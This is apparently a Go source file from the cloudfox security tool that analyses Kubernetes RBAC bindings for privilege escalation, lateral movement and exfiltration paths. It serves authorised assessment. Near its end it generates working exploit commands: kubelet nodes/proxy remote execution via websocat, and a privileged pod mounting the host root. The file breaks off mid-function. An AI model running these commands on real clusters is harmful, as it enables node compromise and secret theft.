package attackpathservice

import (
	"context"
	"fmt"

	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/sdk"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	v1 "k8s.io/api/rbac/v1"
	"k8s.io/client-go/kubernetes"
)

// AttackPathService provides analysis for privilege escalation, lateral movement, and data exfiltration paths in K8s
type AttackPathService struct {
	clientset  *kubernetes.Clientset
	logger     *internal.Logger
	moduleName string
}

// New creates a new AttackPathService using the shared clientset
func New() (*AttackPathService, error) {
	clientset, err := sdk.GetClientset()
	if err != nil {
		return nil, fmt.Errorf("failed to get clientset: %w", err)
	}
	logger := internal.NewLogger()
	return &AttackPathService{
		clientset:  clientset,
		logger:     &logger,
		moduleName: "attackpath", // generic name for service
	}, nil
}

// NewWithClientset creates an AttackPathService with a specific clientset
func NewWithClientset(clientset *kubernetes.Clientset) *AttackPathService {
	logger := internal.NewLogger()
	return &AttackPathService{
		clientset:  clientset,
		logger:     &logger,
		moduleName: "attackpath",
	}
}

// SetModuleName updates the module name for logging purposes
func (s *AttackPathService) SetModuleName(moduleName string) {
	s.moduleName = moduleName
}

// PrivescPermission represents a permission that enables privilege escalation
type PrivescPermission struct {
	Verb        string `json:"verb"`
	Resource    string `json:"resource"`
	APIGroup    string `json:"apiGroup"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// LateralMovementPermission represents a permission that enables lateral movement
type LateralMovementPermission struct {
	Verb        string `json:"verb"`
	Resource    string `json:"resource"`
	APIGroup    string `json:"apiGroup"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// DataExfilPermission represents a permission that enables data exfiltration
type DataExfilPermission struct {
	Verb        string `json:"verb"`
	Resource    string `json:"resource"`
	APIGroup    string `json:"apiGroup"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// AttackPath represents an attack path (exfil, lateral, or privesc)
type AttackPath struct {
	Principal      string   `json:"principal"`
	PrincipalType  string   `json:"principalType"` // User, Group, ServiceAccount
	Method         string   `json:"method"`
	TargetResource string   `json:"targetResource"`
	Permissions    []string `json:"permissions"`
	Category       string   `json:"category"`
	RiskLevel      string   `json:"riskLevel"`
	Description    string   `json:"description"`
	ExploitCommand string   `json:"exploitCommand"`
	Namespace      string   `json:"namespace"`
	ScopeType      string   `json:"scopeType"` // cluster, namespace
	ScopeID        string   `json:"scopeId"`   // namespace name or "cluster"
	ScopeName      string   `json:"scopeName"`
	PathType       string   `json:"pathType"` // "exfil", "lateral", or "privesc"
	RoleName       string   `json:"roleName"` // The role/clusterrole granting this
	BindingName    string   `json:"bindingName"`
}

// CombinedAttackPathData holds all attack paths across cluster/namespace levels
type CombinedAttackPathData struct {
	ClusterPaths   []AttackPath            `json:"clusterPaths"`
	NamespacePaths map[string][]AttackPath `json:"namespacePaths"` // namespace -> paths
	AllPaths       []AttackPath            `json:"allPaths"`
	Namespaces     []string                `json:"namespaces"`
}

// GetPrivescPermissions returns permissions that enable privilege escalation
func GetPrivescPermissions() []PrivescPermission {
	return []PrivescPermission{
		// Cluster Admin - CRITICAL
		{Verb: "*", Resource: "*", APIGroup: "*", Category: "Cluster Admin", RiskLevel: shared.RiskCritical, Description: "Full cluster administrative access (cluster-admin equivalent)"},

		// RBAC Escalation - CRITICAL
		{Verb: "create", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Create cluster-wide role bindings to escalate privileges"},
		{Verb: "create", Resource: "rolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskHigh, Description: "Create namespace role bindings to escalate privileges"},
		{Verb: "bind", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Bind any cluster role without having its permissions"},
		{Verb: "bind", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskHigh, Description: "Bind any role without having its permissions"},
		{Verb: "escalate", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Create/update roles with permissions not held"},
		{Verb: "escalate", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Create/update roles with permissions not held"},
		{Verb: "update", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskHigh, Description: "Modify cluster roles to add permissions"},
		{Verb: "patch", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskHigh, Description: "Patch cluster roles to add permissions"},

		// Impersonation - CRITICAL
		{Verb: "impersonate", Resource: "users", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskCritical, Description: "Impersonate any user including cluster-admin"},
		{Verb: "impersonate", Resource: "groups", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskCritical, Description: "Impersonate any group including system:masters"},
		{Verb: "impersonate", Resource: "serviceaccounts", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskHigh, Description: "Impersonate any service account"},
		{Verb: "impersonate", Resource: "userextras/*", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskHigh, Description: "Impersonate with extra user info"},

		// Pod Creation (Container Escape) - CRITICAL
		{Verb: "create", Resource: "pods", APIGroup: "", Category: "Pod Creation", RiskLevel: shared.RiskCritical, Description: "Create privileged pods for container escape or node access"},
		{Verb: "create", Resource: "pods/exec", APIGroup: "", Category: "Pod Exec", RiskLevel: shared.RiskHigh, Description: "Execute commands in existing containers"},
		{Verb: "create", Resource: "pods/attach", APIGroup: "", Category: "Pod Exec", RiskLevel: shared.RiskHigh, Description: "Attach to running containers"},

		// Workload Creation with SA - HIGH
		{Verb: "create", Resource: "deployments", APIGroup: "apps", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create deployments with privileged service accounts"},
		{Verb: "create", Resource: "daemonsets", APIGroup: "apps", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create daemonsets running on all nodes"},
		{Verb: "create", Resource: "statefulsets", APIGroup: "apps", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create statefulsets with privileged access"},
		{Verb: "create", Resource: "replicasets", APIGroup: "apps", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create replicasets with privileged access"},
		{Verb: "create", Resource: "jobs", APIGroup: "batch", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create jobs with privileged service accounts"},
		{Verb: "create", Resource: "cronjobs", APIGroup: "batch", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create cronjobs for persistent access"},

		// Workload Modification - HIGH
		{Verb: "patch", Resource: "pods", APIGroup: "", Category: "Pod Modification", RiskLevel: shared.RiskHigh, Description: "Modify pods to inject containers or change security context"},
		{Verb: "update", Resource: "pods", APIGroup: "", Category: "Pod Modification", RiskLevel: shared.RiskHigh, Description: "Update pods to inject containers or change security context"},
		{Verb: "patch", Resource: "deployments", APIGroup: "apps", Category: "Workload Modification", RiskLevel: shared.RiskHigh, Description: "Modify deployments to inject backdoors"},
		{Verb: "update", Resource: "deployments", APIGroup: "apps", Category: "Workload Modification", RiskLevel: shared.RiskHigh, Description: "Update deployments to inject backdoors"},
		{Verb: "patch", Resource: "daemonsets", APIGroup: "apps", Category: "Workload Modification", RiskLevel: shared.RiskHigh, Description: "Modify daemonsets for node-wide persistence"},
		{Verb: "update", Resource: "daemonsets", APIGroup: "apps", Category: "Workload Modification", RiskLevel: shared.RiskHigh, Description: "Update daemonsets for node-wide persistence"},

		// Service Account Token - HIGH
		{Verb: "create", Resource: "serviceaccounts/token", APIGroup: "", Category: "Token Creation", RiskLevel: shared.RiskHigh, Description: "Generate tokens for any service account"},
		{Verb: "create", Resource: "tokenrequests", APIGroup: "", Category: "Token Creation", RiskLevel: shared.RiskHigh, Description: "Request tokens for service accounts"},

		// Node Access - CRITICAL
		{Verb: "create", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskCritical, Description: "Register rogue nodes to steal secrets"},
		{Verb: "update", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Modify node configurations"},
		{Verb: "proxy", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Proxy requests to kubelet API"},
		{Verb: "get", Resource: "nodes/proxy", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskCritical, Description: "Access kubelet API via nodes/proxy to execute commands on all pods (RCE) - ref: grahamhelton.com/blog/nodes-proxy-rce"},

		// Webhook Admission Controllers - CRITICAL
		{Verb: "create", Resource: "validatingwebhookconfigurations", APIGroup: "admissionregistration.k8s.io", Category: "Webhook", RiskLevel: shared.RiskCritical, Description: "Create validating webhooks to intercept/block requests"},
		{Verb: "create", Resource: "mutatingwebhookconfigurations", APIGroup: "admissionregistration.k8s.io", Category: "Webhook", RiskLevel: shared.RiskCritical, Description: "Create mutating webhooks to inject malicious content"},
		{Verb: "update", Resource: "validatingwebhookconfigurations", APIGroup: "admissionregistration.k8s.io", Category: "Webhook", RiskLevel: shared.RiskCritical, Description: "Modify validating webhooks"},
		{Verb: "update", Resource: "mutatingwebhookconfigurations", APIGroup: "admissionregistration.k8s.io", Category: "Webhook", RiskLevel: shared.RiskCritical, Description: "Modify mutating webhooks"},

		// CSR Approval - HIGH
		{Verb: "approve", Resource: "certificatesigningrequests/approval", APIGroup: "certificates.k8s.io", Category: "Certificate", RiskLevel: shared.RiskHigh, Description: "Approve CSRs to generate valid certificates"},
		{Verb: "update", Resource: "certificatesigningrequests/approval", APIGroup: "certificates.k8s.io", Category: "Certificate", RiskLevel: shared.RiskHigh, Description: "Approve CSRs to generate valid certificates"},

		// PersistentVolume - HIGH
		{Verb: "create", Resource: "persistentvolumes", APIGroup: "", Category: "Storage", RiskLevel: shared.RiskHigh, Description: "Create hostPath PVs for node filesystem access"},
	}
}

// GetLateralMovementPermissions returns permissions that enable lateral movement
func GetLateralMovementPermissions() []LateralMovementPermission {
	return []LateralMovementPermission{
		// Pod Exec - HIGH (lateral to other pods)
		{Verb: "create", Resource: "pods/exec", APIGroup: "", Category: "Pod Access", RiskLevel: shared.RiskHigh, Description: "Execute commands in pods across namespaces"},
		{Verb: "create", Resource: "pods/attach", APIGroup: "", Category: "Pod Access", RiskLevel: shared.RiskHigh, Description: "Attach to pods across namespaces"},
		{Verb: "create", Resource: "pods/portforward", APIGroup: "", Category: "Pod Access", RiskLevel: shared.RiskMedium, Description: "Port forward to access internal services"},

		// Service Account Token Theft - HIGH
		{Verb: "get", Resource: "secrets", APIGroup: "", Category: "Token Theft", RiskLevel: shared.RiskHigh, Description: "Read SA tokens from secrets for impersonation"},
		{Verb: "list", Resource: "secrets", APIGroup: "", Category: "Token Theft", RiskLevel: shared.RiskHigh, Description: "List and read SA tokens from secrets"},
		{Verb: "create", Resource: "serviceaccounts/token", APIGroup: "", Category: "Token Theft", RiskLevel: shared.RiskHigh, Description: "Generate tokens for lateral movement"},

		// ConfigMap Access (often contains service URLs) - MEDIUM
		{Verb: "get", Resource: "configmaps", APIGroup: "", Category: "Config Access", RiskLevel: shared.RiskMedium, Description: "Read configuration for service discovery"},
		{Verb: "list", Resource: "configmaps", APIGroup: "", Category: "Config Access", RiskLevel: shared.RiskMedium, Description: "List configurations for service discovery"},

		// Service/Endpoint Discovery - MEDIUM
		{Verb: "get", Resource: "services", APIGroup: "", Category: "Service Discovery", RiskLevel: shared.RiskMedium, Description: "Discover services for lateral movement"},
		{Verb: "list", Resource: "services", APIGroup: "", Category: "Service Discovery", RiskLevel: shared.RiskMedium, Description: "List services for lateral movement"},
		{Verb: "get", Resource: "endpoints", APIGroup: "", Category: "Service Discovery", RiskLevel: shared.RiskMedium, Description: "Discover pod IPs for direct access"},
		{Verb: "list", Resource: "endpoints", APIGroup: "", Category: "Service Discovery", RiskLevel: shared.RiskMedium, Description: "List pod IPs for direct access"},

		// Node Access - HIGH
		{Verb: "proxy", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Proxy to kubelet for node-level access"},
		{Verb: "get", Resource: "nodes/proxy", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Access kubelet API for pod listing"},

		// Network Policy Bypass - HIGH
		{Verb: "delete", Resource: "networkpolicies", APIGroup: "networking.k8s.io", Category: "Network", RiskLevel: shared.RiskHigh, Description: "Delete network policies to enable lateral movement"},
		{Verb: "update", Resource: "networkpolicies", APIGroup: "networking.k8s.io", Category: "Network", RiskLevel: shared.RiskHigh, Description: "Modify network policies to allow traffic"},
		{Verb: "patch", Resource: "networkpolicies", APIGroup: "networking.k8s.io", Category: "Network", RiskLevel: shared.RiskHigh, Description: "Patch network policies to allow traffic"},

		// Namespace Access - MEDIUM
		{Verb: "get", Resource: "namespaces", APIGroup: "", Category: "Namespace Discovery", RiskLevel: shared.RiskMedium, Description: "Discover namespaces for lateral movement targets"},
		{Verb: "list", Resource: "namespaces", APIGroup: "", Category: "Namespace Discovery", RiskLevel: shared.RiskMedium, Description: "List namespaces for lateral movement targets"},

		// Pod Discovery - MEDIUM
		{Verb: "get", Resource: "pods", APIGroup: "", Category: "Pod Discovery", RiskLevel: shared.RiskMedium, Description: "Find pods for lateral movement"},
		{Verb: "list", Resource: "pods", APIGroup: "", Category: "Pod Discovery", RiskLevel: shared.RiskMedium, Description: "List pods for lateral movement"},

		// Ingress/Gateway - MEDIUM
		{Verb: "update", Resource: "ingresses", APIGroup: "networking.k8s.io", Category: "Ingress", RiskLevel: shared.RiskMedium, Description: "Modify ingress to redirect traffic"},
		{Verb: "patch", Resource: "ingresses", APIGroup: "networking.k8s.io", Category: "Ingress", RiskLevel: shared.RiskMedium, Description: "Patch ingress to redirect traffic"},
	}
}

// GetDataExfilPermissions returns permissions that enable data exfiltration
func GetDataExfilPermissions() []DataExfilPermission {
	return []DataExfilPermission{
		// Secrets - CRITICAL
		{Verb: "get", Resource: "secrets", APIGroup: "", Category: "Secrets", RiskLevel: shared.RiskCritical, Description: "Read secrets containing credentials, API keys, certificates"},
		{Verb: "list", Resource: "secrets", APIGroup: "", Category: "Secrets", RiskLevel: shared.RiskCritical, Description: "List and read all secrets"},
		{Verb: "*", Resource: "secrets", APIGroup: "", Category: "Secrets", RiskLevel: shared.RiskCritical, Description: "Full access to secrets"},

		// ConfigMaps - HIGH (may contain sensitive configs)
		{Verb: "get", Resource: "configmaps", APIGroup: "", Category: "ConfigMaps", RiskLevel: shared.RiskHigh, Description: "Read configmaps that may contain sensitive data"},
		{Verb: "list", Resource: "configmaps", APIGroup: "", Category: "ConfigMaps", RiskLevel: shared.RiskHigh, Description: "List and read all configmaps"},

		// Pod Logs - HIGH
		{Verb: "get", Resource: "pods/log", APIGroup: "", Category: "Logs", RiskLevel: shared.RiskHigh, Description: "Read pod logs that may contain sensitive data"},

		// Pod Exec (for data extraction) - HIGH
		{Verb: "create", Resource: "pods/exec", APIGroup: "", Category: "Data Extraction", RiskLevel: shared.RiskHigh, Description: "Exec into pods to extract data"},

		// PersistentVolume Claims - HIGH
		{Verb: "get", Resource: "persistentvolumeclaims", APIGroup: "", Category: "Storage", RiskLevel: shared.RiskHigh, Description: "Access persistent volume claims for data access"},
		{Verb: "create", Resource: "persistentvolumeclaims", APIGroup: "", Category: "Storage", RiskLevel: shared.RiskHigh, Description: "Create PVCs to access existing PVs"},

		// Custom Resources (may contain sensitive data) - MEDIUM
		{Verb: "get", Resource: "*", APIGroup: "*", Category: "Custom Resources", RiskLevel: shared.RiskMedium, Description: "Read custom resources that may contain sensitive data"},
		{Verb: "list", Resource: "*", APIGroup: "*", Category: "Custom Resources", RiskLevel: shared.RiskMedium, Description: "List custom resources that may contain sensitive data"},

		// Service Account Tokens - HIGH
		{Verb: "create", Resource: "serviceaccounts/token", APIGroup: "", Category: "Token Exfil", RiskLevel: shared.RiskHigh, Description: "Generate SA tokens for external use"},

		// Etcd (if accessible) - CRITICAL
		{Verb: "get", Resource: "pods/exec", APIGroup: "", Category: "Etcd Access", RiskLevel: shared.RiskCritical, Description: "Exec access to etcd pods for database dump"},
	}
}

// getCacheKeyForPathType returns the cache key for a given path type
func getCacheKeyForPathType(pathType string) string {
	switch pathType {
	case "privesc":
		return sdk.CacheKeyAttackPathsPrivesc
	case "lateral":
		return sdk.CacheKeyAttackPathsLateral
	case "exfil":
		return sdk.CacheKeyAttackPathsExfil
	case "all":
		return sdk.CacheKeyAttackPathsAll
	default:
		return sdk.CacheKey("k8s-attackpaths", pathType)
	}
}

// CombinedAnalysis performs attack path analysis across cluster and namespace scopes.
// Results are cached for the duration of the session to avoid redundant computation.
func (s *AttackPathService) CombinedAnalysis(ctx context.Context, pathType string) (*CombinedAttackPathData, error) {
	cacheKey := getCacheKeyForPathType(pathType)

	// Check cache first
	if cached, found := sdk.Get(cacheKey); found {
		if result, ok := cached.(*CombinedAttackPathData); ok {
			return result, nil
		}
	}

	result := &CombinedAttackPathData{
		ClusterPaths:   []AttackPath{},
		NamespacePaths: make(map[string][]AttackPath),
		AllPaths:       []AttackPath{},
		Namespaces:     []string{},
	}

	// Get target namespaces (respects namespace filtering flags)
	namespaces := shared.GetTargetNamespaces(ctx, s.clientset, s.logger, s.moduleName)
	result.Namespaces = namespaces

	// Analyze cluster-level RBAC
	clusterPaths, err := s.AnalyzeClusterAttackPaths(ctx, pathType)
	if err != nil {
		// Log but continue with namespace analysis - this is expected if user lacks permissions
		_ = err
	}
	result.ClusterPaths = clusterPaths
	result.AllPaths = append(result.AllPaths, clusterPaths...)

	// Analyze namespace-level RBAC
	for _, ns := range namespaces {
		nsPaths, err := s.AnalyzeNamespaceAttackPaths(ctx, ns, pathType)
		if err != nil {
			// Skip namespaces we can't access - expected if user lacks permissions
			continue
		}
		if len(nsPaths) > 0 {
			result.NamespacePaths[ns] = nsPaths
			result.AllPaths = append(result.AllPaths, nsPaths...)
		}
	}

	// Cache the computed result
	sdk.Set(cacheKey, result)

	return result, nil
}

// AnalyzeClusterAttackPaths analyzes ClusterRoleBindings for attack paths
func (s *AttackPathService) AnalyzeClusterAttackPaths(ctx context.Context, pathType string) ([]AttackPath, error) {
	var paths []AttackPath

	// Get ClusterRoleBindings (cached)
	crbsList, err := sdk.GetClusterRoleBindings(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list ClusterRoleBindings: %w", err)
	}

	// Get ClusterRoles (cached)
	clusterRolesList, err := sdk.GetClusterRoles(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list ClusterRoles: %w", err)
	}

	// Build ClusterRole map
	crMap := make(map[string]*v1.ClusterRole)
	for i := range clusterRolesList {
		crMap[clusterRolesList[i].Name] = &clusterRolesList[i]
	}

	// Analyze each ClusterRoleBinding
	for _, crb := range crbsList {
		cr, ok := crMap[crb.RoleRef.Name]
		if !ok {
			continue
		}

		for _, subject := range crb.Subjects {
			subjectPaths := s.analyzeRulesForAttackPaths(
				subject,
				cr.Rules,
				crb.RoleRef.Name,
				crb.Name,
				"cluster",
				"cluster",
				"cluster-wide",
				pathType,
			)
			paths = append(paths, subjectPaths...)
		}
	}

	return paths, nil
}

// AnalyzeNamespaceAttackPaths analyzes RoleBindings in a namespace for attack paths
func (s *AttackPathService) AnalyzeNamespaceAttackPaths(ctx context.Context, namespace string, pathType string) ([]AttackPath, error) {
	var paths []AttackPath

	// Get RoleBindings (cached) and filter by namespace
	allRbs, err := sdk.GetRoleBindings(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list RoleBindings in %s: %w", namespace, err)
	}
	var rbs []v1.RoleBinding
	for _, rb := range allRbs {
		if rb.Namespace == namespace {
			rbs = append(rbs, rb)
		}
	}

	// Get Roles (cached) and filter by namespace
	allRoles, err := sdk.GetRoles(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list Roles in %s: %w", namespace, err)
	}
	var roles []v1.Role
	for _, role := range allRoles {
		if role.Namespace == namespace {
			roles = append(roles, role)
		}
	}

	// Get ClusterRoles (RoleBindings can reference ClusterRoles) (cached)
	clusterRoles, err := sdk.GetClusterRoles(ctx, s.clientset)
	if err != nil {
		return nil, fmt.Errorf("failed to list ClusterRoles: %w", err)
	}

	// Build Role maps
	roleMap := make(map[string]*v1.Role)
	for i := range roles {
		roleMap[roles[i].Name] = &roles[i]
	}
	crMap := make(map[string]*v1.ClusterRole)
	for i := range clusterRoles {
		crMap[clusterRoles[i].Name] = &clusterRoles[i]
	}

	// Analyze each RoleBinding
	for _, rb := range rbs {
		var rules []v1.PolicyRule

		if rb.RoleRef.Kind == "Role" {
			if role, ok := roleMap[rb.RoleRef.Name]; ok {
				rules = role.Rules
			}
		} else if rb.RoleRef.Kind == "ClusterRole" {
			if cr, ok := crMap[rb.RoleRef.Name]; ok {
				rules = cr.Rules
			}
		}

		if len(rules) == 0 {
			continue
		}

		for _, subject := range rb.Subjects {
			subjectPaths := s.analyzeRulesForAttackPaths(
				subject,
				rules,
				rb.RoleRef.Name,
				rb.Name,
				"namespace",
				namespace,
				namespace,
				pathType,
			)
			paths = append(paths, subjectPaths...)
		}
	}

	return paths, nil
}

// verbMatchesRule returns true if the rule verb covers the permission verb.
// Handles: exact match and "*" wildcard.
func verbMatchesRule(ruleVerb, permVerb string) bool {
	return ruleVerb == "*" || ruleVerb == permVerb
}

// resourceMatchesRule returns true if the rule resource covers the permission resource.
// Handles: exact match, "*" wildcard, and parent resource covering subresources
// (e.g., rule "nodes" does NOT cover "nodes/proxy" in K8s RBAC — subresources are distinct).
func resourceMatchesRule(ruleResource, permResource string) bool {
	return ruleResource == "*" || ruleResource == permResource
}

// apiGroupMatchesRule returns true if the rule API group covers the permission API group.
func apiGroupMatchesRule(ruleGroup, permGroup string) bool {
	return ruleGroup == "*" || ruleGroup == permGroup
}

// matchedPermission holds a matched permission with its resolved verb/resource for exploit generation
type matchedPermission struct {
	category       string
	riskLevel      string
	description    string
	matchedVerb    string // The actual verb from the permission definition (not the wildcard)
	matchedResource string // The actual resource from the permission definition
}

// findMatchingPrivescPermissions returns all privesc permissions that a given RBAC rule grants.
// This properly expands wildcards: e.g., verb "*" + resource "nodes/proxy" matches "get nodes/proxy".
func findMatchingPrivescPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []matchedPermission {
	var matches []matchedPermission
	seen := make(map[string]bool) // deduplicate by category+resource

	for _, perm := range GetPrivescPermissions() {
		if verbMatchesRule(ruleVerb, perm.Verb) &&
			resourceMatchesRule(ruleResource, perm.Resource) &&
			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {

			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
			if seen[key] {
				continue
			}
			seen[key] = true

			matches = append(matches, matchedPermission{
				category:        perm.Category,
				riskLevel:       perm.RiskLevel,
				description:     perm.Description,
				matchedVerb:     perm.Verb,
				matchedResource: perm.Resource,
			})
		}
	}
	return matches
}

// findMatchingLateralPermissions returns all lateral movement permissions that a given RBAC rule grants.
func findMatchingLateralPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []matchedPermission {
	var matches []matchedPermission
	seen := make(map[string]bool)

	for _, perm := range GetLateralMovementPermissions() {
		if verbMatchesRule(ruleVerb, perm.Verb) &&
			resourceMatchesRule(ruleResource, perm.Resource) &&
			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {

			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
			if seen[key] {
				continue
			}
			seen[key] = true

			matches = append(matches, matchedPermission{
				category:        perm.Category,
				riskLevel:       perm.RiskLevel,
				description:     perm.Description,
				matchedVerb:     perm.Verb,
				matchedResource: perm.Resource,
			})
		}
	}
	return matches
}

// findMatchingExfilPermissions returns all data exfil permissions that a given RBAC rule grants.
func findMatchingExfilPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []matchedPermission {
	var matches []matchedPermission
	seen := make(map[string]bool)

	for _, perm := range GetDataExfilPermissions() {
		if verbMatchesRule(ruleVerb, perm.Verb) &&
			resourceMatchesRule(ruleResource, perm.Resource) &&
			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {

			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
			if seen[key] {
				continue
			}
			seen[key] = true

			matches = append(matches, matchedPermission{
				category:        perm.Category,
				riskLevel:       perm.RiskLevel,
				description:     perm.Description,
				matchedVerb:     perm.Verb,
				matchedResource: perm.Resource,
			})
		}
	}
	return matches
}

// analyzeRulesForAttackPaths analyzes RBAC rules for attack paths.
// Properly expands wildcards: a rule with verb "*" on resource "nodes/proxy"
// will match all known dangerous permissions for that resource (e.g., "get nodes/proxy" RCE).
// Similarly, a rule with resource "*" will match all known dangerous resources for that verb.
func (s *AttackPathService) analyzeRulesForAttackPaths(
	subject v1.Subject,
	rules []v1.PolicyRule,
	roleName string,
	bindingName string,
	scopeType string,
	scopeID string,
	scopeName string,
	pathType string,
) []AttackPath {
	var paths []AttackPath

	// Format principal
	principal := formatPrincipal(subject)
	principalType := subject.Kind

	for _, rule := range rules {
		for _, verb := range rule.Verbs {
			for _, resource := range rule.Resources {
				apiGroups := rule.APIGroups
				if len(apiGroups) == 0 {
					apiGroups = []string{""}
				}

				for _, apiGroup := range apiGroups {
					// Privesc analysis with wildcard expansion
					if pathType == "privesc" || pathType == "all" {
						for _, match := range findMatchingPrivescPermissions(verb, resource, apiGroup) {
							path := AttackPath{
								Principal:      principal,
								PrincipalType:  principalType,
								Method:         match.category,
								TargetResource: match.matchedResource,
								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
								Category:       match.category,
								RiskLevel:      match.riskLevel,
								Description:    match.description,
								ExploitCommand: generateExploitCommand("privesc", match.matchedVerb, match.matchedResource, scopeID, principal),
								Namespace:      subject.Namespace,
								ScopeType:      scopeType,
								ScopeID:        scopeID,
								ScopeName:      scopeName,
								PathType:       "privesc",
								RoleName:       roleName,
								BindingName:    bindingName,
							}
							paths = append(paths, path)
						}
					}

					// Lateral movement analysis with wildcard expansion
					if pathType == "lateral" || pathType == "all" {
						for _, match := range findMatchingLateralPermissions(verb, resource, apiGroup) {
							path := AttackPath{
								Principal:      principal,
								PrincipalType:  principalType,
								Method:         match.category,
								TargetResource: match.matchedResource,
								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
								Category:       match.category,
								RiskLevel:      match.riskLevel,
								Description:    match.description,
								ExploitCommand: generateExploitCommand("lateral", match.matchedVerb, match.matchedResource, scopeID, principal),
								Namespace:      subject.Namespace,
								ScopeType:      scopeType,
								ScopeID:        scopeID,
								ScopeName:      scopeName,
								PathType:       "lateral",
								RoleName:       roleName,
								BindingName:    bindingName,
							}
							paths = append(paths, path)
						}
					}

					// Data exfiltration analysis with wildcard expansion
					if pathType == "exfil" || pathType == "all" {
						for _, match := range findMatchingExfilPermissions(verb, resource, apiGroup) {
							path := AttackPath{
								Principal:      principal,
								PrincipalType:  principalType,
								Method:         match.category,
								TargetResource: match.matchedResource,
								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
								Category:       match.category,
								RiskLevel:      match.riskLevel,
								Description:    match.description,
								ExploitCommand: generateExploitCommand("exfil", match.matchedVerb, match.matchedResource, scopeID, principal),
								Namespace:      subject.Namespace,
								ScopeType:      scopeType,
								ScopeID:        scopeID,
								ScopeName:      scopeName,
								PathType:       "exfil",
								RoleName:       roleName,
								BindingName:    bindingName,
							}
							paths = append(paths, path)
						}
					}
				}
			}
		}
	}

	return paths
}

// Helper functions



func formatPrincipal(subject v1.Subject) string {
	switch subject.Kind {
	case "ServiceAccount":
		if subject.Namespace != "" {
			return fmt.Sprintf("%s:%s", subject.Namespace, subject.Name)
		}
		return subject.Name
	case "User", "Group":
		return subject.Name
	default:
		return subject.Name
	}
}

func generateExploitCommand(pathType, verb, resource, scope, principal string) string {
	namespaceFlag := ""
	if scope != "cluster" {
		namespaceFlag = fmt.Sprintf("-n %s ", scope)
	}

	// =========================================================================
	// Resource-specific exploit commands (shared across path types)
	// These are checked first since many resources appear in multiple path types.
	// =========================================================================

	switch resource {

	// --- nodes/proxy RCE ---
	case "nodes/proxy":
		return `# nodes/proxy RCE - execute commands on any pod via kubelet API (ref: grahamhelton.com/blog/nodes-proxy-rce)
# 1. Get a token: TOKEN=$(kubectl create token <sa-name>)
# 2. Get node IPs: kubectl get nodes -o wide
# 3. List pods on node: curl -sk -H "Authorization: Bearer $TOKEN" https://<NODE_IP>:10250/pods
# 4. Execute command on any pod:
websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://<NODE_IP>:10250/exec/<namespace>/<pod>/<container>?output=1&error=1&command=id"`

	// --- Pod creation / execution ---
	case "pods":
		switch verb {
		case "create":
			return fmt.Sprintf(`# Create a privileged pod with host access
kubectl %srun privesc --image=alpine --restart=Never --overrides='{
  "spec":{
    "serviceAccountName":"%s",
    "hostNetwork":true,"hostPID":true,"hostIPC":true,
    "containers":[{
      "name":"privesc","image":"alpine",
      "command":["sh","-c","sleep 3600"],
      "securityContext":{"privileged":true},
      "volumeMounts":[{"name":"host","mountPath":"/host"}]
    }],
    "volumes":[{"name":"host","hostPath":{"path":"/"}}]
  }
}' -- sleep 3600`, namespaceFlag, principal)
		case "patch", "update":
			return fmt.Sprintf(`# Modify existing pod to inject a privileged container or change service account
